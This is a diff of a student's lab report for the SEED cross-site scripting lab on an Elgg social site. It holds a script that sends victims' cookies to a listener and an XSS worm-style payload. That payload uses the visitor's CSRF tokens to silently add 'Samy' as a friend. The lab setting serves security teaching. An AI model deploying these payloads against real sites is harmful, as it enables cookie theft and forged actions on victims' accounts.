@@ -52,22 +52,30 @@
     <script>document.write('<img src=http://localhost:5555?c='+escape(document.cookie)+'>');</script>
 #+END_SRC
 ** Screenshot
-    [[./screenshots/task-3-steal-cookie.png]]
+    j[[./screenshots/task-3-steal-cookie.png]]
 
 
 * Task 4
+** Insert malacious JS script tag in the about me section of profile
 #+BEGIN_SRC js
-<script type="text/javascript">
-  window.onload = function () {
-    var Ajax=null;
-    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
-    var token="&__elgg_token="+elgg.security.token.__elgg_token;
-    //Construct the HTTP request to add Samy as a friend.
-    var sendurl=`http://www.seed-server.com/action/friends/add?friend=59&__elgg_ts=${ts}&__elgg_token=${token}`; 
-    //Create and send Ajax request to add friend
-    Ajax=new XMLHttpRequest();
-    Ajax.open("GET", sendurl, true);
-    Ajax.send();
-}
-</script>
+  <script type="text/javascript">
+    window.onload = function () {
+      var Ajax=null;
+      var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+      var token="&__elgg_token="+elgg.security.token.__elgg_token;
+      //Construct the HTTP request to add Samy as a friend.
+      var sendurl='http://www.seed-server.com/action/friends/add?friend=59'+ts+token; 
+      //Create and send Ajax request to add friend
+      Ajax=new XMLHttpRequest();
+      Ajax.open("GET", sendurl, true);
+      Ajax.send();
+    }
+  </script>
 #+END_SRC
+
+Here when Alice visits Samy's profile a Samy will be automatically befriended with his profile visitor(victim).
+The script attached in the about me section will be executed and that will silently send a request from victim's end.
+** Screenshot
+[[./screenshots/task-4-victim-befriended.png]]
+
+
